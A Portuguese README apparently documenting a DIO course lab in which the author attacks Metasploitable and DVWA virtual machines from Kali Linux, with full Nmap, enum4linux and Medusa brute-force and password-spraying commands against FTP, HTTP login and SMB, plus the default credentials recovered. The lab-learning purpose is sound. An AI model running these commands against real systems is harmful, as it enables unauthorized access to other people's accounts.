# Desafio de ataque Kali Linux da DIO

Repositório criado para documentação do desafio realizado da DIO.

## Informações e assuntos gerais

Inicialmente foram apresentados tipos comuns de ataque como: Ataques de dicionário, força bruta ou híbridos (partindo de wordlists porém fazendo modificações adaptáveis); Também foi abordado sobre password spraying que seria o ato de utilizar uma senha da vítima em vários sites e logins.

## Preparação de ambiente e ferramentas

O download e instalação das VMs Kali Linux e Metasploitable que serão utilizados no laboratório foram feitos, assim como instalação/atualização de ferramentas para uso posterior como: Ncrack, John the Ripper, WPScan, Patator, Hydra, e Nmap. Todas sendo baseadas em quebra de usuário e senhas sendo algumas com certos ajustes finos visando fugir de detecções.

## Verificação e enumeração

Procedimentos de verificação de conexão e enumeração foram feitos como:

Pingar as máquinas entre si utilizando o comando:

> ping -c 4 192.168.0.X

sendo X referente a máquina local da **minha** rede.

Verificação de versão, portas e serviços abertos, utilizando Nmap na máquina alvo:

> nmap -sV -p 21,22,80,443,139 192.168.0.X

Tentativa de conexão com ftp para verificar situaçao do serviço:

> ftp 192.168.0.X

## Entrando em ação com Medusa

Nos tópicos abaixo foram feitos ataques em ambiente controlado tanto em rede local quanto ambiente web.

### Tentativa de ataque em máquina local

Para intrusão na máquina, foi escolhido o programa **Medusa**. Utilizando listas de usuários e senhas já prontas, o comando utilizado foi:

> medusa -h 192.168.0.X -U usuarios.txt -P senhas.txt -M ftp -t 4

Após um certo tempo de processo o aplicativo retorna sucesso exibindo as credenciais:

> User: msfadmin / Password: msfadmin

### Tentativa de ataque no DVWA

Para acesso do sistema web foi inserido o endereço:

> 192.168.0.X/dvwa/login.php

Ao tentar efetuar uma tentativa de login, analisando através das ferramentas de desenvolvedor em Network>Request é possível obter os parâmetros que o servidor utiliza como entrada e confirmação de login bem sucedido ou não.

> "username:" "password:" "Login:"

Utilizando novamente o programa Medusa, a tentativa de ataque automatizada foi feita utilizando novamente wordlists prontas de usuários e senhas, segue comando utilizado:

> medusa -h 192.168.0.X -U usuarios.txt -P senhas.txt -M http \
> -m PAGE: '/dvwa/login.php' \
> -m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
> -m 'FAIL=Login failed' -t 4

Após processamento, foi retornado como sucesso o login:

> "username=admin" e "password=password"

## Exploração de SMB (Server Message Block)

O SMB é um serviço windows muito importante que tem como função o compartilhamento de arquivos, pastas, e impressoras. Também autenticação de usuários e comunicação de maquinas windows e linux.

Após um suposto acesso a rede interna, foi "descoberto" um servidor SMB ativo e os proximos passos foram descobrir usuários existentes e fazer um ataque brute force silencioso.

### Enum4linux

Para enumeração foi feita uma varredura utilizando o **enum4linux** com o seguinte comando:

> enum4linux -a 192.168.0.X | tee enum4_output.txt

Após processamento e exportação do resultado, é possivel acessá-lo com:

> less enum4_output.txt

### Ataque com Password Spraying!

A próxima etapa foi efetuar um password spraying em todos os usuários obtidos com uma lista de senhas.A finalidade é obter acesso ao sistema sem que cause tanto ruído comparado a um brute force padrão. Para isso a mesma lista de senhas usada anteriormente (senhas.txt) e uma lista de usuarios descoberta na enumeração (usuarios1.txt) foi utilizada.

Novamente com Medusa foi feita a tentativa de ataque pelo comando:

> medusa -h 192.168.0.X -U usuarios1.txt -P senhas.txt -M smbnt -t 2 -T 50

### Verificando credenciais obtidas

Seguindo após a finalização do processo da Medusa, uma tentativa de login foi feita usando as credenciais obtidas.

> smbclient -L //192.168.0.X -U msfadmin
> (senha solicitada) msfadmin

Acesso liberado!
